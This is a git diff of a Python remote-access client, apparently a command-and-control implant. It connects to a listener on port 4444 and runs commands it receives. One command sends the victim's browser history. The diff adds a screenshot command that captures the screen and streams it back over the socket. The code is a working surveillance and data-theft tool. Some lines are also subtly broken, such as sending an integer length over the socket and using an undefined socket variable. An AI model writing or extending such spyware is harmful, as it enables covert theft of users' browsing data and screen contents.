@@ -9,6 +9,7 @@ import platform as plt
 import socket
 import pickle
 from datetime import datetime
+import numpy as np
 
 MAC_ADDRESS = get_mac_address()
 LOCATION = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
@@ -17,8 +18,6 @@ IP_ADDRESS = "127.0.0.1"
 PLATFORM = {"system": plt.system(), "release": plt.release(), "version": plt.version()}
 
 class CCA_CLIENT:
-
-
     def __init__(self, host, port):
         self.host = host
         self.port = port
@@ -29,7 +28,7 @@ class CCA_CLIENT:
         sock.connect((self.host, self.port))
         sending = socket.gethostbyname(socket.gethostname())
         sock.send(sending.encode())
-        print(f"[*] Connected to host: {self.host}:{self.port}")
+        print(f"[*] Connected to host {self.host}:{self.port}")
 
     def execute(self):
         while True:
@@ -41,7 +40,11 @@ class CCA_CLIENT:
             elif command == "bhistory":
                 sock.send(self.getHistory())
 
-            elif command == "exit":
+            elif command == "screenshot":
+                print('started scrn')
+                self.getScreenshot()
+
+            elif command == "exitclient":
                 sock.send(b"exit")
                 break
 
@@ -59,16 +62,23 @@ class CCA_CLIENT:
         return pickle.dumps(b_history)
 
     def getScreenshot(self):
-        screenshot = ImageGrab.grab()
-        save_path = os.path.join(LOCATION, f"scrn/{MAC_ADDRESS}_{self.getTS()}.jpg")
-        screenshot.save(save_path)
-        screenshot.show()
-        return save_path
+        print('started screenshot')
+        img_array = np.array(ImageGrab.grab())
+        img_path = os.path.join(LOCATION, f"scrn/{MAC_ADDRESS}_{self.getTS()}.npy")
+        np.save(img_path, img_array)
+        file = open(img_path, 'rb')
+        data = file.read(1024)
+        sock.send(data)
+        while data != b'':
+            print('sending...')
+            data = file.read(1024)
+            sock.send(len(data))
+        sock.send(b'')
+        print('[*] Screenshot sent successfully')
 
-
-client = CCA_CLIENT("127.0.0.1", 4444)
 
 if __name__ == "__main__":
+    client = CCA_CLIENT("127.0.0.1", 4444)
     while True:
         try:
             client.start_connection()
